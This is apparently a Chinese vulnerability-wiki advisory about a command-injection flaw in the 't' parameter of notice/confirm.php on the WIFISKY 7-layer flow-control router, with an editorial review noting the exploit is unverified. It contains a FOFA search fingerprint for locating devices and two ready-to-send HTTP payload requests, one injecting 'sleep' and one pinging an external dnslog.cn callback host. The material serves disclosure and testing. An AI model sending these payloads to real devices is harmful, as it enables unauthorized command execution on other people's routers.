---
source: "wy876 漏洞文库"
id: "vw-60b26efab54d4ef87acb0744"
entity_id: "ve-60b26efab54d4ef87acb0744"
schema_version: "1"
fofa_unverified: "title="
title: "WIFISKY 7层流控路由器confirm存在命令执行漏洞"
product: "WIFISKY 7层流控路由器"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "请求含SESSID，无版本或权限角色"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/WIFISKY/WIFISKY7%E5%B1%82%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8confirm%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据；回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/rgxgp78mynikfbld"
source_status: "recorded"
---

# WIFISKY 7层流控路由器confirm存在命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：WIFISKY 7层流控路由器
- 本文讨论：notice/confirm.php t参数命令注入
- 版本、权限与配置前提：请求含SESSID，无版本或权限角色
- 资料类型：命令注入请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- sleep与DNS请求无时间对照/回连证据，认证要求未说明
- fofa元数据残缺；固定DNS域名的环境与授权仍待核对；无补丁
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
- 回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE

### 待核与来源

- 版本、会话角色、延迟/出网结果待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
WIFISKY-7层流控路由器是深圳市领空技术有限公司（简称“领空技术"）的一款产品，深圳市领空技术有限公司是扎根深圳辐射的网络通讯设备供应商，致力于网络通讯设备产品的研究与开发。WIFISKY 7层流控路由器 confirm 接口存在一个命令执行漏洞，使得攻击者可以通过构造特定的请求远程执行恶意代码。此漏洞可能导致攻击者获取系统权限、执行任意命令，严重威胁系统的机密性和完整性。

# 二、影响版本
+ WIFISKY-7层流控路由器

# 三、资产测绘
+ fofa`title="WIFISKY 7层流控路由器"`
+ 特征


# 四、漏洞复现
```http
GET /notice/confirm.php?t=;sleep%203 HTTP/1.1
Host: 
Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


```http
GET /notice/confirm.php?t=;ping%20ofo3df.dnslog.cn HTTP/1.1
Host: 
Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rgxgp78mynikfbld>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
